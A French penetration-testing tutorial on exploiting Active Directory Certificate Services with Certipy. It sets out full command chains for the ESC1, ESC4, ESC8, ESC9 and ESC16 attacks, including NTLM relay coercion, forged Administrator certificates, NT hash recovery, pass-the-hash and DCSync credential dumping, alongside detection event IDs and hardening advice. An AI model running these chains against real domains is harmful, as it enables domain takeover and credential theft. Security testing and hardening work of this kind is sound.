AD Certificate Services : Cartographier et exploiter la PKI d'entreprise

Certipy de l'énumération à l'authentification : ESC1, ESC4, ESC8, ESC9 et ESC16. Chaînes complètes, conditions d'exploitation et Event IDs de détection.

Avertissement légal : Ces techniques sont destinées aux tests d'intrusion autorisés. Les attaques ADCS génèrent des certificats signés par la CA de production : toujours documenter et nettoyer après exploitation.

Pourquoi ADCS est une surface critique

Active Directory Certificate Services est déployé dans la majorité des grandes entreprises Windows, souvent par défaut avec les paramètres d'installation de Windows Server. Le problème : la plupart des administrateurs traitent ADCS comme une boîte noire. Ils savent qu'elle signe des certificats, pas qu'elle expose des chemins directs vers Domain Admin.

Contrairement à Kerberoasting ou à l'abus d'ACLs, une exploitation ADCS produit un artefact légitime : un certificat signé par la CA interne. Avec lui, on obtient une authentification PKINIT (demande d'un TGT Kerberos) ou, via certipy auth, la récupération directe du NT hash de n'importe quel compte, y compris Administrator ou krbtgt.

Chemin d'attaque typique via ADCS

Foothold → Certipy find → Template/CA vulnérable → Certificat Administrator → NT Hash / TGT

Architecture ADCS en deux minutes

Trois composants à comprendre avant d'énumérer :

  • Certificate Authority (CA) : Signe les certificats. Ses propres ACLs, flags de configuration et paramètres d'enrollment sont une surface d'attaque indépendante des templates.
  • Certificate Templates : Définissent qui peut demander quoi. Chaque template a ses propres ACLs (qui peut s'inscrire), ses EKU (usages du certificat) et ses flags (est-ce que le demandeur peut spécifier le SAN ?). C'est là que vivent ESC1, ESC2, ESC3, ESC4.
  • Enrollment endpoints : HTTP (/certsrv), RPC, DCOM. L'endpoint HTTP accepte l'authentification NTLM par défaut, ce qui ouvre ESC8.
Extension de sécurité (szOID_NTDS_CA_SECURITY_EXT) : Introduite en 2022 (KB5014754), cette extension encode le SID de l'utilisateur demandeur directement dans le certificat. Elle sert au DC à vérifier que le certificat appartient bien au compte qu'il prétend représenter. Sa désactivation (au niveau template pour ESC9, au niveau CA pour ESC16) rouvre les attaques d'usurpation d'UPN.

Énumération avec Certipy

# Énumération complète : CA, templates, vulnérabilités
certipy find -u user@corp.local -p '<password>' -dc-ip 192.168.1.1 -vulnerable -stdout

# Export BloodHound (pour visualiser les chemins via ADCS)
certipy find -u user@corp.local -p '<password>' -dc-ip 192.168.1.1 -bloodhound

# Depuis Linux sans compte (énumération LDAP anonyme si autorisée)
certipy find -u '' -p '' -dc-ip 192.168.1.1 -vulnerable

La sortie de certipy find -vulnerable classe directement les templates par type de vulnérabilité (ESC1, ESC2, etc.) avec le nom de la CA, le template concerné, et qui peut s'y inscrire. C'est le point de départ de tout audit ADCS.

ESC1 : Spécifier le SAN soi-même

C'est la vulnérabilité ADCS la plus directe. Si un template a le flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT et que les utilisateurs de faible privilège peuvent s'y inscrire, on peut demander un certificat avec n'importe quel UPN dans le champ Subject Alternative Name, y compris administrator@corp.local.

# 1. Identifier un template ESC1
certipy find -u user@corp.local -p '<password>' -dc-ip 192.168.1.1 -vulnerable -stdout
# → Chercher : [!] Vulnerabilities : ESC1

# 2. Demander un certificat pour Administrator
certipy req -u user@corp.local -p '<password>' \
    -ca CORP-CA -target ca.corp.local \
    -template VulnerableTemplate \
    -upn administrator@corp.local
# → administrator.pfx

# 3. Authentifier et récupérer le NT hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1
# → administrator:<NT hash>
OPSEC : La demande de certificat génère l'Event ID 4886 (certificate requested) sur la CA. Si le template a "Manager Approval" activé, la requête reste en attente. ESC1 ne fonctionne que si l'enrollment est automatique.

ESC4 : Write ACL sur un template → ESC1 à la demande

ESC4 est indirect mais très courant. Si un compte compromis a WriteProperty ou WriteDacl sur un template, on peut le modifier pour y activer le flag ENROLLEE_SUPPLIES_SUBJECT, le transformer temporairement en ESC1, exploiter, puis restaurer.

# 1. Vérifier les ACLs sur les templates
certipy find -u user@corp.local -p '<password>' -dc-ip 192.168.1.1 -vulnerable -stdout
# → [!] Vulnerabilities : ESC4

# 2. Modifier le template pour activer ENROLLEE_SUPPLIES_SUBJECT
certipy template -u user@corp.local -p '<password>' \
    -template VulnerableTemplate \
    -save-old
# → certipy modifie le template et sauvegarde l'état original

# 3. Exploiter comme ESC1
certipy req -u user@corp.local -p '<password>' \
    -ca CORP-CA -target ca.corp.local \
    -template VulnerableTemplate \
    -upn administrator@corp.local

# 4. Restaurer le template (critique en mission réelle)
certipy template -u user@corp.local -p '<password>' \
    -template VulnerableTemplate \
    -configuration VulnerableTemplate.json
Toujours restaurer : Modifier un template de production impacte tous les clients qui s'y inscrivent. Certipy sauvegarde automatiquement l'état avec -save-old. Ne jamais quitter une mission sans restaurer.

ESC8 : NTLM Relay vers l'endpoint HTTP

L'endpoint web enrollment (http://ca.corp.local/certsrv/) accepte l'authentification NTLM par défaut et ne requiert pas de signature. Si on peut forcer un DC ou une machine à s'authentifier vers notre listener (PetitPotam, PrinterBug, Responder), on peut relay vers la CA et obtenir un certificat machine ou Domain Controller.

# Terminal 1 : Listener certipy relay
certipy relay -ca ca.corp.local -template DomainController
# → Attend une connexion NTLM entrante

# Terminal 2 : Forcer l'authentification du DC (PetitPotam)
python3 PetitPotam.py -d corp.local -u user -p '<password>' <attacker-ip> dc01.corp.local
# → DC01$ s'authentifie vers notre listener

# Certipy relay relaie vers la CA, obtient un certificat pour DC01$
# → dc01.pfx

# Authentification PKINIT avec le certificat machine
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.1
# → dc01$:<NT hash>

# DCSync avec le hash machine du DC
impacket-secretsdump -hashes :<NT hash> 'corp.local/dc01$@192.168.1.1'
Prérequis ESC8 : La CA doit avoir l'enrollment web activé (IIS + certsrv). Vérifier avec certipy find : la section CA indique les endpoints actifs. Extended Protection for Authentication (EPA) bloque le relay si activé.

ESC9 et ESC16 : Abus de l'extension de sécurité désactivée

Ces deux variantes exploitent l'absence de l'extension szOID_NTDS_CA_SECURITY_EXT, qui encode normalement le SID du demandeur dans le certificat. Sans cette extension, le DC ne peut pas vérifier que le porteur du certificat correspond bien au compte référencé dans l'UPN. Le swap d'identité redevient possible.

Condition commune : avoir GenericWrite (ou équivalent) sur un compte de service ou un compte utilisateur cible.

# --- ESC9 : Flag NO_SECURITY_EXTENSION sur le template ---

# 1. Repérer un template ESC9 et un compte cible avec GenericWrite
certipy find -u user@corp.local -p '<password>' -dc-ip 192.168.1.1 -vulnerable -stdout

# 2. Modifier l'UPN du compte cible vers administrator@corp.local
certipy account update -u user@corp.local -p '<password>' \
    -user target_account -upn administrator@corp.local

# 3. Demander un certificat avec le compte cible (on s'authentifie en tant que target_account)
certipy req -u target_account@corp.local -p '<target-password>' \
    -ca CORP-CA -template VulnerableTemplate

# 4. Restaurer l'UPN original
certipy account update -u user@corp.local -p '<password>' \
    -user target_account -upn target_account@corp.local

# 5. Authentifier avec le certificat : le DC voit "administrator" dans l'UPN
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 192.168.1.1
# --- ESC16 : Extension de sécurité désactivée au niveau CA ---
# Même chaîne qu'ESC9, mais s'applique à TOUS les templates de la CA
# Pas besoin de template spécifique avec NO_SECURITY_EXTENSION

# Vérifier la désactivation au niveau CA
certipy find -u user@corp.local -p '<password>' -dc-ip 192.168.1.1 -stdout
# → CA flags : DisableExtensionList contient szOID_NTDS_CA_SECURITY_EXT

# La chaîne d'exploitation est identique à ESC9
# n'importe quel template d'authentification utilisateur est exploitable
ESC16 vs ESC9 : ESC9 est une désactivation au niveau template (le flag CT_FLAG_NO_SECURITY_EXTENSION dans les propriétés du template). ESC16 est une désactivation globale au niveau de la CA. Elle affecte tous les templates et est donc plus impactante. Les deux nécessitent un GenericWrite sur le compte cible pour modifier l'UPN.

De l'authentification certificat au NT hash

Une fois un certificat obtenu (quelle que soit la variante ESC), certipy auth effectue une authentification PKINIT (Kerberos avec clé publique). En cas de succès, le DC retourne un TGT et, dans la réponse AS-REP, le NT hash chiffré. Certipy le déchiffre automatiquement.

# Authentification PKINIT → NT hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1
# [*] Using principal: administrator@corp.local
# [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:<NT hash>

# Utiliser le NT hash pour Pass-the-Hash
impacket-psexec -hashes :<NT hash> administrator@192.168.1.1

# Ou DCSync pour dump complet
impacket-secretsdump -hashes :<NT hash> corp.local/administrator@192.168.1.1
Quand PKINIT échoue : Sur certains environnements, le DC refuse PKINIT si le certificat n'est pas mappé au bon compte (StrongCertificateBindingEnforcement = 2). Dans ce cas, tenter certipy auth -pfx cert.pfx -ldap-shell pour obtenir un shell LDAP via SChannel plutôt que Kerberos.

Hardening rapide

  • Auditer avec certipy régulièrement : automatiser certipy find -vulnerable dans les pipelines de sécurité interne.
  • Activer l'extension de sécurité : appliquer KB5014754, vérifier que szOID_NTDS_CA_SECURITY_EXT est bien présent dans les certificats émis.
  • Désactiver l'enrollment web NTLM : activer EPA (Extended Protection for Authentication) sur le endpoint certsrv.
  • Auditer les ACLs des templates : aucun groupe non-admin ne doit avoir WriteProperty ou WriteDacl sur des templates d'authentification.
  • Manager Approval : activer l'approbation manuelle sur tous les templates ouverts à l'enrollment d'utilisateurs de faible privilège.
